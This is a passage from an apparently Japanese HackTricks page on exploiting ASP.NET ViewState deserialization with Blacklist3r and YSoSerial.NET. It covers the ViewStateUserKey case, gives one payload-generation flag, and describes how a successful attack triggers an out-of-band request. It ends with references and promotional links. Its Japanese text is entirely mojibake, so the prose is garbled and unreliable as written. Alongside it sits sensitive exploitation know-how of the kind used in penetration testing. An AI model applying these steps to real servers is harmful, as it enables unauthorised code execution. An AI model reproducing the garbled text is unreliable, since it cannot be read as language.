ViewStateé€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®è„†å¼±æ€§ã‚’æˆåŠŸè£ã«æ‚ªç”¨ã™ã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å«ã‚€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¢ã‚¦ãƒˆãƒ»ã‚ªãƒ–ãƒ»ãƒãƒ³ãƒ‰ãƒ»ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒç™ºç”Ÿã—ã¾ã™ã€‚ã“ã®ç¨®ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€ã€ŒBlacklist3rã€ã¨ã€ŒYsoSerial.NETã€ã‚’ä½¿ç”¨ã—ãŸViewStateé€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã®æ‚ªç”¨ã‚’ç¤ºã—ãŸæ¦‚å¿µå®Ÿè¨¼ï¼ˆPoCï¼‰ã§ç¤ºã•ã‚Œã¦ãŠã‚Šã€[æˆåŠŸã—ãŸæ‚ªç”¨ã®PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹6 â€“ ViewStateUserKeysãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹

**ViewStateUserKey**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯**CSRFæ”»æ’ƒ**ã«å¯¾æŠ—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã“ã®ã‚ˆã†ãªã‚­ãƒ¼ãŒå®šç¾©ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ä»Šã¾ã§ã«è­°è«–ã•ã‚ŒãŸæ–¹æ³•ã§ViewStateãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã‚ˆã†ã¨ã—ã¦ã‚‚ã€**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå‡¦ç†ã•ã‚Œãªã„**ã§ã—ã‚‡ã†ã€‚\
æ­£ã—ããƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ã¯ã€ã•ã‚‰ã«1ã¤ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### æˆåŠŸã—ãŸæ”»æ’ƒã®çµæœ <a href="#poc" id="poc"></a>

ã™ã¹ã¦ã®ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ã«ãŠã„ã¦ã€ViewState YSoSerial.Net ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ**æˆåŠŸ**ã—ãŸå ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¯ã€Œ**500 Internal server error**ã€ã¨ã„ã†å¿œç­”ã‚’è¿”ã—ã€ã€Œ**The state information is invalid for this page and might be corrupted**ã€ã¨ã„ã†å¿œç­”ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒè¡¨ç¤ºã•ã‚Œã€OOBãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™ã€‚

è©³ç´°ã¯[ã“ã¡ã‚‰]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))ã‚’ã”ç¢ºèªãã ã•ã„ã€‚

## å‚è€ƒæ–‡çŒ®

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ãƒãƒƒã‚­ãƒ³ã‚°ã‚­ãƒ£ãƒªã‚¢**ã«èˆˆå‘³ãŒã‚ã‚Šã€**è§£èª­ä¸èƒ½ãªã‚‚ã®ã‚’ãƒãƒƒã‚¯**ã—ãŸã„å ´åˆã¯ã€**æ¡ç”¨ä¸­**ã§ã™ï¼ï¼ˆ_æµæš¢ãªãƒãƒ¼ãƒ©ãƒ³ãƒ‰èªã®èª­ã¿æ›¸ããŒå¿…è¦ã§ã™_ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ã§ã€ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼**ã—ãŸã„å ´åˆã‚„ã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ã”ç¢ºèªãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>
